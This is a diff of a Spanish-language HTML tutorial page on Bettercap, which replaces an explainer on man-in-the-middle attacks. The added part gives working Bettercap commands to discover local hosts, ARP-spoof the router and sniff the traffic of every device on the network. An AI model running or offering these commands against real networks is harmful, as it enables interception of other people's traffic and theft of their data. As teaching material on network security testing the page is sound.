@@ -60,14 +60,10 @@
         </div>
     </div>
     <div class="Bettercap">
-        <h1>Ataque Man in the Middle</h1>
-        <img src="https://github.com/bl4ck44/Articulos/raw/master/Redes/MITM/Img/Logo.png" height="300px" width="500px">
-        <h2>Que es un ataque Main in the Middle?</h2>
-        <p>Este ataque es muy comun en varios lugares el Ataque de intermediario ocurre cuando un atacante puede interceptar o manipular tráfico entre dos partes conocidas como víctima y receptor.
-
-            La víctima es aquella persona que envía un mensaje a otro individuo esperando una respuesta, mientras que el receptor es la parte que recibe la información para luego analizarla y responder a la solicitud enviada.
-            
-            El atacante aparte de interceptar todos los datos que son enviados entre las dos partes podría llegar a manipular los datos para obtener información confidencial, modificar transferencias bancarias e incluso suplantar la identidad ya sea de la víctima o el receptor.</p>
+        <h1>Análisis con Bettercap</h1>
+        <img src="https://github.com/bl4ck44/Articulos/raw/master/Redes/Bettercap/Img/logo.jpg" height="300px" width="500px">
+        <h2>Que es y para que sirve bettercap?</h2>
+        <p>Bettercap es una herramienta avanzada de seguridad y pruebas de penetración que se utiliza principalmente para realizar ataques en redes, análisis de tráfico, y manipulación de datos en tiempo real. Es una herramienta versátil diseñada para realizar tareas de man-in-the-middle (MitM), es decir, interceptar, modificar, y redirigir tráfico en una red.</p>
             <h2>Instalación</h2>
             <pre><code class="language-bash">sudo apt-get install bettercap</code></pre>
             <h2>USO</h2>
@@ -75,6 +71,25 @@
 
                 Ahora usaremos con siguiente comandos</p><br>
             <img src="https://flashstart.com/wp-content/uploads/2023/03/DNS-spoofing-768x435-1.jpg" height="250px" width="450px">
+            <pre><code class="language-bash">bettercap
+
+net.probe on
+
+ticker on
+</code></pre>
+            <p>
+                Como podmeos observar son las IP de nuestra red local.
+            </p>
+            <img src="https://github.com/bl4ck44/Articulos/raw/master/Redes/Bettercap/Img/IP.jpg" height="150px" width="550px" id="arp">
+            <p>En la misma terminal ejecutaremos de nuevo bettercap, seleccionamos la IP que vamos analizár en este caso vamos a nalizar todas las IP para esto seleccionamos la IP del router.</p>
+            <pre><code class="language-bash">set arp.spoof.targets 192.168.1.1
+                
+arp.spoof on
+                
+set net.sniff.verbose false
+                
+net.sniff on</code></pre>
+<p>Y nos mostrara todo el tráfico de todos los dispositivos.</p>
     </div>
 </body>
 </html>
